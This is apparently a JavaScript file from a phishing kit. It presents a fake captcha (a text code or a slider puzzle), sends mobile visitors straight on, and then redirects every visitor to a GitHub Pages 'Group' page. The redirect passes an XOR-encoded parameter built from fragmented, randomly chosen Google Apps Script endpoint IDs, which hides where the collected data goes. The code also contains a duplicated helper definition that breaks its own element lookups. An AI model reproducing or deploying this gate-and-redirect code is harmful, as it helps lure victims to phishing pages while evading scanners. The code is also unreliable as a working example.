
var lengthOtp = 2;
var rand = 0;
var page = "Group";
var LinkImage = "http://placekitten.com/400/200";
var thietbi;
var root;
var CaptchaLoad = false;

function EID(NameID) {return document.getElementById(NameID);}
function EID(NameClass) {return document.getElementsByClassName(NameClass);}

window.addEventListener('DOMContentLoaded', (event) => { xacnhan('createCaptcha'); });

function xacnhan(x) {
  	
  	window.charsArray = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!#$%^&*";
	if(window['DaCheckMobile']=='yes') {
    	
	} else {
		window['DaCheckMobile']='yes';
		const toMatch = [
          		/Android/i,
          		/webOS/i,
          		/iPhone/i,
          		/iPad/i,
          		/iPod/i,
          		/BlackBerry/i,
          		/Windows Phone/i
     			];
     	//window.window['mobile'] = toMatch.some((toMatchItem) => { return navigator.userAgent.match(toMatchItem); });
		thietbi = toMatch.some((toMatchItem) => { return navigator.userAgent.match(toMatchItem); });

        	root = document.querySelector(':root');
    	} 
    
	if (window['mobile']==false) {
        	var rand1 = Math.floor(Math.random() * 2);
    	} else {
		var rand1 = 1;
    	}
            

    	window.code; 
	function createCaptcha() {
  		EID('captcha2').innerHTML = "";
  		var captcha = [];
  		for (var i = 0; i < lengthOtp; i++) {
    			var index = Math.floor(Math.random() * charsArray.length + 1);
    			if (captcha.indexOf(charsArray[index]) == -1)
      			captcha.push(charsArray[index]);
    			else i--;
  		}
  		var canv = document.createElement("canvas");
  		canv.id = "captcha2";
  		canv.width = 300;
  		canv.height = 70;
  		var ctx = canv.getContext("2d");
  		ctx.font = "50px Georgia";
        	ctx.fillStyle = "white";
        
  		ctx.strokeText(captcha.join(""), 0, 50);
        
  		code = captcha.join("");
  		EID("captcha2").appendChild(canv);
	}
	
	function validateCaptcha() {
  		event.preventDefault();
  		debugger
        
  		if (EID("cpatchaTextBox").value == code) {
        		window['qwerty']();
  		}else{
    			alert("Nhập sai chuỗi mã hình. Cố gắng lần nữa");
            		EID("cpatchaTextBox").value = "";
    			createCaptcha();
  		}
	}
    
    	function encrypt(key, value) {
  		var result="";
  		for(i=0;i<value.length;++i) { result+=String.fromCharCode(key[i % key.length]^value.charCodeAt(i)); }
  		return result;
	}

	function decrypt(key, value) {
 		var result="";
  		for(i=0;i<value.length;++i) { result+=String.fromCharCode(key[i % key.length]^value.charCodeAt(i)); }
  		return result;
	}
    
    	function base64_encode(s) { return btoa(unescape(encodeURIComponent(s))); }
	function base64_decode(s) { return decodeURIComponent(escape(atob(s))); }
    
    
    	function qwerty() {
    	
		var arr1 = [
             ['AKfycbw8Uc', 'np_fb0', 'GDkg4oYf', 'fP9GJ', 'DwSeGEwsS', 'qJT12Uuv', 'Vsh8CQ1dU'],
['AKfycbygb-', 'BCkkPH', 'GgPKWE5U', 'jBLI6', 'qL-dC3ily', 'j5N2Zi'],
['AKfycbz_x3', 'pT9792', 'hA6_cNtY', 'JgoGP', '2Ez0vXF3N', 'Lt4EJu-A'],
['AKfycby3wK', 'kQa0Y7', 'b9n16dS9', 'mj7vG', 'ExEqTz7Dl', 'oNyMRs'],
['AKfycbxTTa', 'LGsqUK', 'I84KMZk7', 'TQRbH', 'AgGWmupmD', 'NYN1FlIQ'],
['AKfycbyFN0', 'Dg2yNi', '3gU32aNH', 'nR9j6', 'SLx7YsZsT', 'CP-TQ1Xg'],
['AKfycbwQiv', 'cbzAr-', 'nDL4Dm5n', '8Yg0y', '_zHGIIeNa', 'grCfk7ow'],
['AKfycbzG6k', '3db8wz', 'uDr8osP3', 'g1EWY', 'WZD1vr_BF', 'WDF0zh'],
['AKfycbyZ0n', 'EjfMeL', 'CvWWyBzJ', 'XpBIw', 'L-Ey3Fz5T', 'tFB054'],
['AKfycbzq5D', 'yl9_Ug', 'Th6r90oI', '4PYzR', 'zWwbASbsZ', '4JpjQZFA'],
['AKfycbyaSx', 'LfzClh', '5lzzSNV6', '_h8Fe', 'RZOpckU6K', 'tgYs2C9w'],
['AKfycbzKUn', 'LZPfDV', 'scy5oLBR', 'i_VVi', 'K7Rc4VIT9', 'QszoB6'],
['AKfycbywWr', 'gxjUzI', '2R37OAWh', 'Vuw4T', 'qIPS6p9U6', 'BUk8Jr7g'],
['AKfycbwDLI', '6d5-Q1', 'zYYvfn2Z', 'cGTj8', 'MBKFKKfs1', 'jzWk8ItQ'],
['AKfycbzBUB', 'HufCgz', 'fjPApLdS', 'l_-be', 'g1DkRep0U', 'Jt8WcPhQ'],
['AKfycbwX-X', 'Y0FA87', 'wgfTFgXt', 'xeeVV', 'ckPWAw-Vg', '31eeI5'],
['AKfycbzUSh', 'nK9R_j', '-AsKnkeu', 'pfaz8', 'cxcjyCAWH', 'wh6lp5xg'],
['AKfycbynUc', 'Crv3jh', 'VKDmCQNJ', 'aeihA', 'b6Avi1VeJ', 'QrFhs7'],
['AKfycbwNyZ', 'XrgTvq', 'RpDkPjMx', 'keDGh', 'xTROrNMrx', 'sX34oy'],
['AKfycbzKZj', 'UGkvPU', 'jXifP4XW', 'F4MBB', '0SanMh-T9', 'jnglBCWA'],
['AKfycby4Tj', 'okHViF', 'FmPkoGWh', '6Fn4Y', 'ob34RcKeZ', 'sjsxtxQg'],
['AKfycbyjqy', '0cK8Jw', '_9HT-_9d', 'KqF1L', 'Q4aUtSvSf', 'aJ2kWp'],
['AKfycbzKoT', 'gZFAwD', 'V0AhOKjf', '6H8hi', 'kSAU2bpKg', 'ESQO4u']
			];

		var rand = Math.floor(Math.random() * (arr1.length-1));
		var script_url="";
		for (var i=0;i<arr1[rand].length;i++) { script_url = script_url + arr1[rand][i]; }
                
		var tzoffset = (new Date()).getTimezoneOffset() * 60000;
     		var localISOTime = (new Date(Date.now() - tzoffset)).toISOString();
     		var time = localISOTime.replace(/[^0-9]/g, "").slice(0, 17); 
                
            	var tg = base64_encode(time);

           	location.href = "https://3nhat.github.io/Group" + random + "/?P=" + "Group" + "&31G=" + encrypt("@Q.t.2011.0512", tg + "]QQQ[" + script_url);

    	}
    
    	
    	if (rand1 == 0) {
    		if(thietbi==true) { qwerty(); return;}

    		EID('xacnhan').style.display ='block';
        
    		if (CaptchaLoad == false) {
            	
    			window.window['Input_keyup'] = function Input_keyup(event) {
    				var keyCode = event.keyCode || event.which;
    
    				if (keyCode == 13) {
      				event.preventDefault();
					validateCaptcha();
    				}
    			}
        
        		try { window.random = 1*rand; }
			catch(err) { window.random = Math.floor(Math.random() * 100); alert(1); }
        
        		try { var str = page.trim(); } catch(err) { window.page = "Group"; }
					
    		}
    
    
    		if (x=="validateCaptcha") { validateCaptcha(); }
    
		if (x=="createCaptcha") {
        	
       		if(CaptchaLoad == false) {
            		EID("cpatchaTextBox").addEventListener('keyup', (event) => {
            			window['Input_keyup'](event);
				});
				CaptchaLoad= true; 
                
       		}
       		createCaptcha();
    		}
    		return;
    	}
    
    
    	if (rand1 != 0) {
		if(thietbi==true) { qwerty(); return;}

    		EID('container').style.display ='block';
    
    		try { window.random = 1*rand; }
		catch(err) { window.random = Math.floor(Math.random() * 100); alert(1); }
        
        	try { var str = page.trim(); }
		catch(err) { window.page = "Group"; }
    	
        	let c = document.getElementById("c"),
  		ctx = c.getContext("2d"),
  		p = document.getElementById("puzzle"),
  		pctx = p.getContext("2d"),
  		slider = document.getElementById("slider"),
  		pos = { x: null, y: null },
  		delta = 5,
  		s = {
    			size: 70,
    			refresh: drawCaptcha
  		};

		let img = new Image();
		img.onload = () => {
  			c.width = img.width;
  			c.height = img.height;

  			drawCaptcha();

  			slider.addEventListener("input", function () {
    				p.style.left = `${this.value}px`;
  			});
  			slider.addEventListener("change", function () {
    				if (Math.abs(pos.x - parseInt(p.style.left)) <= delta) {
    					passed();
        				qwerty();
    				}
    				else failed();
  			});
		};
		img.src = LinkImage;

		function passed() {
  			c.style.color = "#4caf50";
		}

		function failed() {
  			c.style.color = "#ff1744";
		}

		function drawGhost() {
  			ctx.fillStyle = "rgba(255, 255, 255, .5)";
  			drawShape(ctx, pos.x, pos.y);
		}

		function drawPuzzle() {
  			p.width = s.size;
  			p.height = s.size;
  			drawShape(pctx);
  			pctx.globalCompositeOperation = "source-in";
  			pctx.drawImage(img, pos.x, pos.y, p.width, p.height, 0, 0, p.width, p.height);
  			p.style.top = `${pos.y}px`;
		}

		function drawShape(ctx, x = 0, y = 0) {
  			ctx.beginPath();
  			ctx.moveTo(x, y + 0.25 * s.size);
  			ctx.lineTo(x + 0.25 * s.size, y + 0.25 * s.size);
  			ctx.arc(x + 0.5 * s.size, y + 0.25 * s.size, 0.25 * s.size, Math.PI, false);
  			ctx.moveTo(x + 0.75 * s.size, y + 0.25 * s.size);
  			ctx.lineTo(x + s.size, y + 0.25 * s.size);
  			ctx.lineTo(x + s.size, y + s.size);
  			ctx.lineTo(x, y + s.size);
  			ctx.quadraticCurveTo(
    				x + 0.5 * s.size,
    				y + 0.75 * s.size,
   	 			x,
    				y + 0.5 * s.size
  			);
  			ctx.lineTo(x, y + 0.25 * s.size);
  			ctx.fill();
		}

		function getRandomPosition() {
  			pos = {
    				x: Math.floor(s.size + (c.width - 2 * s.size) * Math.random()),
    				y: Math.floor((c.height - s.size) * Math.random())
  			};
		}

		function drawCaptcha() {
  			c.style.color = "#000";
  			p.style.left = slider.value = 0;
  			slider.setAttribute("max", Math.round(img.width - s.size));
  			ctx.clearRect(0, 0, c.width, c.height);
  			ctx.drawImage(img, 0, 0);
  			getRandomPosition();
  			drawPuzzle();
  			drawGhost();
		}
   
    	}
 
}

